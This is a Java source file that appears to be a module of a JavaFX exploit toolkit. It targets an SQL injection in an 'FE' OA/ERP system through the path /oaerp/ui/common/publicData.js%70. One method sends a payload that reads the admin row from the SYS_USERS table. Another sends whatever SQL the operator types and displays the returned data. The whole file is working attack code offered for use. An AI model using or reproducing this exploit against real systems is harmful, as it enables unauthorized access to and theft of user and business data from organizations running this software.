package exp.oa.FE;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class FE_publicData_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            head.put("Content-Type","application/x-www-form-urlencoded");
            String data = "type=getSelectData&table=SYS_USERS&filter=SU01%3D%27admin%27";
            Response var = HttpTools.post(url + "/oaerp/ui/common/publicData.js%70" ,data, head, "utf-8");
            if (var.getCode()==200 && var.getText()!="") {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ FE_publicData_sqli ]");
                    textArea.appendText("\n 请求体:type=getSelectData&table=SYS_USERS&filter=1%3D%271%27\nCMD输入构造请求内容即可");
                    textArea_cmd.appendText(var.getText().trim()+"\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            head.put("Content-Type", "application/x-www-form-urlencoded");
            Response post = HttpTools.post(url + "/oaerp/ui/common/publicData.js%70", sql, head, "utf-8");
            if (post.getCode() == 200 && post.getText() != "") {
                if (post.getText() != "" && post.getCode() == 200) {
                    String var = post.getText();
                    Platform.runLater(() -> {
                        textArea.appendText("\n sql : " + sql + "注入成功");
                        textArea_cmd.appendText("\n" + var.trim());
                        textArea.appendText("\n ");
                    });
                    return true;
                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n sql : " + sql + "注入失败");
                        textArea.appendText("\n ");
                    });
                    return false;
                }
            }
        } catch (Exception E) {
            return false;
        }
        return false;
    }
}
